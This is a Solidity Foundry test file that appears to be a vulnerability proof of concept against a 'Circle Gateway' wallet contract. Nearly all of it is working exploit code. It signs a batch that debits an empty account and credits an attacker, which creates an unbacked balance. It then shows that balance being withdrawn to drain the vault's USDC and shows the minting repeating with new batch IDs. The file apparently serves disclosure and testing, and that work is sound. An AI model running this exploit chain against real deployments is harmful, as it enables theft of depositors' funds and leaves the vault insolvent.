/**
 * PoC: Circle Gateway — batch shortfall soft-fail creates unbacked availableBalance,
 * then initiateWithdrawal + withdraw drains real USDC from the vault.
 *
 * Root cause (Batches._processBatch):
 *   - Credits always apply full delta.value
 *   - Debits use _reduceBalance (saturates at 0) and only emit InsufficientBalance
 *   - MustNetToZero checks NOMINAL int256 sum, not actual deducted amounts
 *
 * Official acknowledgment:
 *   - Burns.sol ~531-532: shortfall is expected failure but processing continues
 *   - Batches.t.sol::testSubmitBatchInsufficientBalance already shows ledger inflation
 *   - AttemptedDoubleSpend.t.sol covers burn/withdraw race, not this mint-via-batch path
 */
pragma solidity ^0.8.29;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {GatewayCommon} from "src/GatewayCommon.sol";
import {GatewayWallet} from "src/GatewayWallet.sol";
import {BatchedDelta} from "src/lib/BatchedDelta.sol";
import {Batches} from "src/modules/wallet/Batches.sol";
import {DeployUtils} from "test/util/DeployUtils.sol";
import {ForkTestUtils} from "test/util/ForkTestUtils.sol";

contract BatchShortfallInflationPoC is Test, DeployUtils {
    using MessageHashUtils for bytes32;

    uint256 internal constant N = 1000 * 10 ** 6; // 1000 USDC (6 decimals)
    uint256 internal constant WITHDRAW_DELAY = 100;

    address internal owner = makeAddr("owner");
    address internal honest = makeAddr("honest");
    address internal underfunded = makeAddr("underfunded"); // 0 balance victim of stale debit
    address internal attacker = makeAddr("attacker");

    address internal batchSigner;
    uint256 internal batchSignerKey;

    address internal usdc;
    uint32 internal domain;
    GatewayWallet internal wallet;

    function setUp() public {
        domain = ForkTestUtils.forkVars().domain;
        wallet = deployWalletOnly(owner, domain);
        usdc = ForkTestUtils.forkVars().usdc;

        batchSignerKey = 0xA11CE;
        batchSigner = vm.addr(batchSignerKey);

        vm.startPrank(owner);
        wallet.addSupportedToken(usdc);
        wallet.addBatchSigner(batchSigner);
        wallet.updateWithdrawalDelay(WITHDRAW_DELAY);
        vm.stopPrank();

        // Honest user deposits N real USDC into the vault (custody backing)
        deal(usdc, honest, N);
        vm.startPrank(honest);
        IERC20(usdc).approve(address(wallet), N);
        wallet.deposit(usdc, N);
        vm.stopPrank();

        assertEq(wallet.availableBalance(usdc, honest), N);
        assertEq(IERC20(usdc).balanceOf(address(wallet)), N);
        assertEq(wallet.availableBalance(usdc, underfunded), 0);
        assertEq(wallet.availableBalance(usdc, attacker), 0);
    }

    function _signBatch(BatchedDelta[] memory deltas, bytes32 batchId)
        internal
        view
        returns (bytes memory calldataBytes, bytes memory signature)
    {
        calldataBytes = abi.encode(deltas, batchId, domain, usdc, address(wallet));
        bytes32 messageHash = keccak256(calldataBytes).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(batchSignerKey, messageHash);
        signature = abi.encodePacked(r, s, v);
    }

    /// Step 1: stale/incorrect off-chain batch: debit N from empty account, credit N to attacker.
    /// Nominal net = 0 → guard passes; actual debit = 0 → attacker gains unbacked +N.
    function test_poc_inflateAvailableBalance_N1000() public {
        BatchedDelta[] memory deltas = new BatchedDelta[](2);
        deltas[0] = BatchedDelta({depositor: underfunded, value: -int256(N)});
        deltas[1] = BatchedDelta({depositor: attacker, value: int256(N)});

        (bytes memory calldataBytes, bytes memory signature) = _signBatch(deltas, keccak256("poc-inflate-1"));

        vm.expectEmit(true, true, false, true);
        emit GatewayCommon.InsufficientBalance(usdc, underfunded, N, 0, 0);

        wallet.submitBatch(calldataBytes, signature);

        assertEq(wallet.availableBalance(usdc, underfunded), 0, "underfunded still 0");
        assertEq(wallet.availableBalance(usdc, attacker), N, "attacker got phantom +N");
        // Vault custody unchanged — no matching deposit for attacker's credit
        assertEq(IERC20(usdc).balanceOf(address(wallet)), N, "custody still only honest deposit");

        console2.log("attacker availableBalance after malicious batch:", wallet.availableBalance(usdc, attacker));
        console2.log("wallet USDC custody:", IERC20(usdc).balanceOf(address(wallet)));
    }

    /// Step 2: convert phantom balance into real USDC via permissionless withdraw path.
    function test_poc_drainVaultViaWithdrawal_N1000() public {
        // Inflate
        BatchedDelta[] memory deltas = new BatchedDelta[](2);
        deltas[0] = BatchedDelta({depositor: underfunded, value: -int256(N)});
        deltas[1] = BatchedDelta({depositor: attacker, value: int256(N)});
        (bytes memory calldataBytes, bytes memory signature) = _signBatch(deltas, keccak256("poc-drain-1"));
        wallet.submitBatch(calldataBytes, signature);
        assertEq(wallet.availableBalance(usdc, attacker), N);

        // Attacker withdraws
        vm.prank(attacker);
        wallet.initiateWithdrawal(usdc, N);
        assertEq(wallet.availableBalance(usdc, attacker), 0);
        assertEq(wallet.withdrawingBalance(usdc, attacker), N);

        vm.roll(block.number + WITHDRAW_DELAY + 1);

        uint256 attackerBefore = IERC20(usdc).balanceOf(attacker);
        vm.prank(attacker);
        wallet.withdraw(usdc);

        assertEq(IERC20(usdc).balanceOf(attacker), attackerBefore + N, "attacker received real USDC");
        assertEq(IERC20(usdc).balanceOf(address(wallet)), 0, "vault drained");
        // Honest depositor still shows N on the ledger but custody is gone
        assertEq(wallet.availableBalance(usdc, honest), N, "honest ledger unchanged (insolvent)");

        console2.log("attacker wallet USDC:", IERC20(usdc).balanceOf(attacker));
        console2.log("gateway custody USDC:", IERC20(usdc).balanceOf(address(wallet)));
    }

    /// Repeatability: new batchId each time can keep minting phantom balance (bounded here by vault size for withdraw).
    function test_poc_repeatableNewBatchId() public {
        for (uint256 i = 0; i < 3; i++) {
            BatchedDelta[] memory deltas = new BatchedDelta[](2);
            deltas[0] = BatchedDelta({depositor: underfunded, value: -int256(uint256(100 * 10 ** 6))});
            deltas[1] = BatchedDelta({depositor: attacker, value: int256(uint256(100 * 10 ** 6))});
            (bytes memory calldataBytes, bytes memory signature) =
                _signBatch(deltas, keccak256(abi.encodePacked("poc-repeat", i)));
            wallet.submitBatch(calldataBytes, signature);
        }
        assertEq(wallet.availableBalance(usdc, attacker), 300 * 10 ** 6);
    }
}
